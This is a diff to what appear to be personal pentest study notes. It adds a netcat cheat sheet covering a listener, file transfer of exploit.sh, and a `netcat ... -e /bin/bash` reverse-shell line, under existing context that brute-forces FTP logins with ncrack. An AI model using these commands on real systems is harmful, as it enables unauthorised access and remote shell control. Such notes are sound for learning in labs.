@@ -12,3 +12,17 @@
 `ncrack -U /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt ftp://10.0.2.15:21 -v`  
 
 for encodings [cyberchef](https://cyberchef.org/)  
+
+Listener:
+`nc -lvp 4444 > incomig.txt` nc is a symlink of netcat  
+TARGET HIGH PORTS  
+Common users usually don't have access to ports under 1000  
+`-l` - listening (opens port 4444 and pipe input into incoming.txt).  
+`v` verbose `p` port 
+
+Sender: 
+`nc -nv 10.0.2.5 4444 < exploit.sh`  
+`n` no DNS resolution  
+
+`netcat 10.0.2.4 4444 -e /bin/bash`  
+eexec that program after connection (TESTING NEEDED)  
